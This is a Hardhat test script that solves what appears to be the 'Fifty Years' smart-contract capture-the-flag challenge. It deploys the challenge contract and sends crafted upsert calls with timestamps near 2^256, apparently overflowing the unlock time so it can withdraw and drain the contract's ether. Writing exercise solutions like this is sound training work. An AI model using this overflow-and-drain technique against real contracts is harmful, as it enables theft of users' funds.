const { expect, assert } = require('chai');
const { BigNumber } = ethers;

const ONE_DAY = 86400;
const MAX_UINT = BigNumber.from(2).pow(256);

describe('FiftyYearsChallenge', function () {
  it.only('should solve the challenge', async function () {
    const [owner] = await ethers.getSigners();

    // Deploy challenge
    const FiftyYearsChallenge = await ethers.getContractFactory('FiftyYearsChallenge');
    const challenge = await FiftyYearsChallenge.deploy(owner.address, { value: ethers.utils.parseEther('1.0') });
    console.log('Original config');
    await printElements(challenge);

    let newIndex = 4;
    console.log(`Upserting at ${newIndex}`);
    await challenge.upsert(newIndex, MAX_UINT.sub(ONE_DAY * 3), { value: 3 });
    await printElements(challenge);

    newIndex = 2;
    console.log(`Upserting at ${newIndex}`);
    await challenge.upsert(newIndex, MAX_UINT.sub(ONE_DAY * 2), { value: 1 });
    await printElements(challenge);

    newIndex = 3;
    console.log(`Upserting at ${newIndex}`);
    await challenge.upsert(newIndex, MAX_UINT.sub(ONE_DAY * 1), { value: 2 });
    await printElements(challenge);

    newIndex = 3;
    console.log(`Upserting at ${newIndex}`);
    await challenge.upsert(newIndex, 0, { value: 3 });
    await printElements(challenge);

    const oldBalance = await ethers.provider.getBalance(challenge.address);
    console.log(`Old balance: ${oldBalance}`);
    await challenge.withdraw(3);
    const newBalance = await ethers.provider.getBalance(challenge.address);
    console.log(`New balance: ${newBalance}`);

    expect(newBalance).to.eq(0);
  });
});

async function printElements(challenge) {
  const l = await challenge.queueLength();
  console.log(`Queue size is ${l}, elements:`);
  for (let i = 0; i < l; i++) {
    const el = await challenge.queue(i);
    console.log(`\tAmount: ${el.amount}, unlock: ${el.unlockTimestamp}`);
  }
  console.log(`Head is ${await challenge.head()}`);
  console.log();
}
